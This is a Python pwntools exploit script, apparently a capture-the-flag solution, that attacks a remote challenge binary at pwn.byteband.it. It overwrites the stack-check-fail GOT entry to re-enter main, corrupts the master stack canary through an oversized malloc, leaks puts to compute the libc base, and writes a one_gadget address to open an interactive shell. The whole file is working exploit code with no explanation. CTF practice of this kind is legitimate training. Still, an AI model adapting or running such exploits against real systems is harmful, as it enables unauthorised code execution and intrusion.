from pwn import *

# R = process('./chall')
R = remote('pwn.byteband.it', 8000)

big_malloc_size = 999999
stack_check_fail_got = 0x601018

def first_main(r):
    main = 0x004007d6
    first_master_canary_offset = 0xf64d8
    r.sendlineafter('size:', str(big_malloc_size))
    payload = str(first_master_canary_offset).encode() #idx
    payload += str(stack_check_fail_got).encode() #where
    payload += p64(main) # overwrite stack_check_fail_got to main function
    payload += str(big_malloc_size).encode() # size in second main function
    r.sendlineafter('idx:', payload)

def second_main_and_runshell(r):
    r.recvuntil('puts: ') #gomi
    puts_offset = 0x809c0
    libc_base = int(r.recvline()[:-1], 16) - puts_offset
    one_gadget_offset = 0x4f322
    one_gadget = libc_base + one_gadget_offset
    
    #second_master_canary_offset = 0x6f74d9 # local
    second_master_canary_offset = 0x1eb4d8 + 1 # remote # 0x1eb4d8 is already 0x1, so +1.

    payload = str(second_master_canary_offset).encode() #idx
    payload += str(stack_check_fail_got).encode() #where
    payload += p64(one_gadget)
    r.sendlineafter('idx:', payload)
    
    r.interactive()

if __name__ == '__main__':
    first_main(R)
    second_main_and_runshell(R)
